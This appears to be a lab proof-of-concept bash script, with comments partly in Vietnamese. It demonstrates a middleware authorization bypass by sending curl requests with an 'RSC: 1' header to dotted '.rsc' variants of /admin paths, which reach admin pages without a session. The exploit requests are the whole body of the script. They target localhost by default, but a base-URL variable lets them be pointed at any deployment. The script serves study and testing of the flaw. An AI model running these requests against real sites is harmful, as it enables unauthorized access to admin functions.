#!/usr/bin/env bash
# LAB ONLY - CVE-2026-44575 (middleware bypass via App Router transport variants).
#
# The middleware matcher excludes paths containing a dot, so a `.rsc` transport
# variant of an /admin route is not matched by middleware. In study mode the
# admin layout has no second role check, so the protected admin route renders
# without a session. The marker below is only printed in LOCAL_CVE_MODE=1.
set -u
FE="${FE_BASE_URL:-http://127.0.0.1:3000}"
MARKER="ADMIN_ROUTE_REACHED_WITHOUT_SESSION"

echo "== 1. Request bình thường (bị middleware chặn) =="
curl -s -o /dev/null -w "GET /admin/orders -> HTTP %{http_code}, redirect=%{redirect_url}\n" "$FE/admin/orders"

echo
echo "== 2. Request transport variant .rsc (không khớp matcher) =="
body=$(curl -s -H 'RSC: 1' "$FE/admin/orders/index.rsc")
code=$(curl -s -o /dev/null -w '%{http_code}' -H 'RSC: 1' "$FE/admin/orders/index.rsc")
echo "GET /admin/orders/index.rsc -> HTTP $code"
echo "$body" | grep -q "$MARKER" && echo "Marker: $MARKER (ĐÃ VÀO TRANG ADMIN KHÔNG CẦN ĐĂNG NHẬP)" || echo "Không thấy marker."

echo
echo "== 3. Kiểm chứng bằng path có dấu chấm khác =="
for p in "/admin/orders/foo.rsc" "/admin/products/.rsc" "/admin/orders/index.RSC"; do
  c=$(curl -s -o /tmp/lab44575 -w '%{http_code}' -H 'RSC: 1' "$FE$p")
  printf '%-32s -> HTTP %s' "$p" "$c"
  grep -q "$MARKER" /tmp/lab44575 && echo "  [ADMIN]" || echo
done
